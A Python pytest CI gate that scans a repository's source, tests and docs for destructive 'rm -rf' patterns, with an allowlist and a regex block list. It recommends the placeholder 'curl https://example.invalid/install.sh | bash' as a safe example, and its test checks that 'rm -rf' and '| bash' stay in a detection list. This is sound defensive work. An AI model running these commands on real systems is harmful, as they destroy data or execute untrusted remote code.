"""CI gate: no destructive shell commands in code, fixtures, or docs.

Exists to catch a regression where someone adds `rm -rf /path` as a
"nice realistic example" in a test fixture, docstring, or README. The
tool never executes these strings — sinks render text, they don't shell
out — but a user who copy-pastes from a fixture or a screenshot into a
terminal is harmed regardless.

Allowed: `DANGEROUS_BASH_PATTERNS` and the tests that verify detection
of those patterns. Everywhere else, use
`curl https://example.invalid/install.sh | bash` which is still
recognizably dangerous but cannot resolve.
"""
from __future__ import annotations

import re
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parent.parent

# Files allowed to contain literal destructive patterns — the WHOLE POINT
# of these files is to match / test the detection.
ALLOWLIST = {
    REPO_ROOT / "src" / "coding_agent_notifier" / "tool_formatters.py",
    REPO_ROOT / "tests" / "test_tool_formatters.py",
    # test_safety.py itself references the patterns in this docstring and
    # the BANNED set below.
    REPO_ROOT / "tests" / "test_safety.py",
    # test_minimal_verbosity has a sentinel string asserting minimal mode
    # does NOT leak a pattern — a negative-space check, not an example.
    REPO_ROOT / "tests" / "test_minimal_verbosity.py",
}

# Patterns we refuse to see outside the allowlist.
BANNED = [
    r"\brm\s+-rf\b",
    r"\brm\s+-fr\b",
    r"\brm\s+-rf\s+/",
    r"\brm\s+-fr\s+/",
]

# Where to scan.
SCAN_DIRS = ["src", "tests", "docs"]
SCAN_EXTENSIONS = {".py", ".md", ".json", ".toml", ".yaml", ".yml", ".plist"}


def _iter_files():
    for sub in SCAN_DIRS:
        root = REPO_ROOT / sub
        if not root.exists():
            continue
        for f in root.rglob("*"):
            if not f.is_file():
                continue
            if f.suffix not in SCAN_EXTENSIONS:
                continue
            if "__pycache__" in f.parts:
                continue
            if f in ALLOWLIST:
                continue
            yield f


def test_no_destructive_rm_patterns_in_repo():
    offenders: list[tuple[Path, int, str]] = []
    compiled = [re.compile(p) for p in BANNED]
    for f in _iter_files():
        try:
            lines = f.read_text(encoding="utf-8", errors="ignore").splitlines()
        except OSError:
            continue
        for i, line in enumerate(lines, 1):
            for rx in compiled:
                if rx.search(line):
                    offenders.append((f.relative_to(REPO_ROOT), i, line.strip()))
                    break
    assert not offenders, (
        "Destructive shell patterns found outside the detection allowlist — "
        "replace with `curl https://example.invalid/install.sh | bash` or similar:\n"
        + "\n".join(f"  {p}:{ln}: {txt}" for p, ln, txt in offenders)
    )


def test_allowlist_entries_exist():
    """If someone deletes an allowlisted file, the allowlist should fail
    loudly rather than silently letting new offenders through."""
    for entry in ALLOWLIST:
        assert entry.exists(), f"allowlisted file missing: {entry}"


def test_dangerous_patterns_still_detected():
    """Regression guard — the detection layer that justifies the
    allowlist must keep working. Moving the banned strings elsewhere
    without also keeping detection alive would silently defeat the
    purpose."""
    from coding_agent_notifier.tool_formatters import DANGEROUS_BASH_PATTERNS
    assert "rm -rf" in DANGEROUS_BASH_PATTERNS
    assert "| bash" in DANGEROUS_BASH_PATTERNS
